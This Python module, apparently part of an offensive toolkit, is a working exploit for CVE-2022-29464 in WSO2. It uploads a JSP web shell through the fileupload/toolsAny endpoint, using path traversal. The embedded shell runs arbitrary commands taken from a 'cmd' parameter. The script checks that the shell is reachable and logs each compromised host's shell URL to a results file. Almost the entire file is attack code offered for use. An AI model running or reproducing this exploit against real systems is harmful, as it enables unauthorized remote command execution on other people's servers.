import requests, urllib3
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class Cve_2022_29464:
    def main(self,target):
        host=target[0].strip('/ ')
        file = target[1]
        ssl = target[2]
        header = target[3]
        proxy = target[4]
        timeout = int(target[5])
        req = ReqSet(header=header, proxy=proxy)
        self.headers = req["header"]
        self.proxy = req["proxy"]

        shell = """<FORM>
            <INPUT name='cmd' type=text>
            <INPUT type=submit value='Run'>
        </FORM>
        <%@ page import="java.io.*" %>
            <%
            String cmd = request.getParameter("cmd");
            String output = "";
            if(cmd != null) {
                String s = null;
                try {
                    Process p = Runtime.getRuntime().exec(cmd,null,null);
                    BufferedReader sI = new BufferedReader(new
        InputStreamReader(p.getInputStream()));
                    while((s = sI.readLine()) != null) { output += s+"</br>"; }
                }  catch(IOException e) {   e.printStackTrace();   }
            }
        %>
                <pre><%=output %></pre>"""
        # OutPrintInfo("WSO2","开始进行文件上传...")
        files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/{file}": shell}
        try:
            response = requests.post(f'{host}/fileupload/toolsAny', files=files, verify=ssl,proxies=self.proxy,headers=self.headers,timeout=timeout)
            url2 = host + f"/authenticationendpoint/{file}"
            ck = requests.get(url2,verify=ssl,proxies=self.proxy,headers=self.headers,timeout=timeout)
            if "run" in ck.text:
                OutPrintInfo("WSO2",f"shell @ {host}/authenticationendpoint/{file}")
                with open("./result/wso2.txt","a") as w:
                    w.write(f"{host}/authenticationendpoint/{file}\n")
        except Exception:
            # OutPrintInfo("WSO2","目标不存在文件上传")
            pass
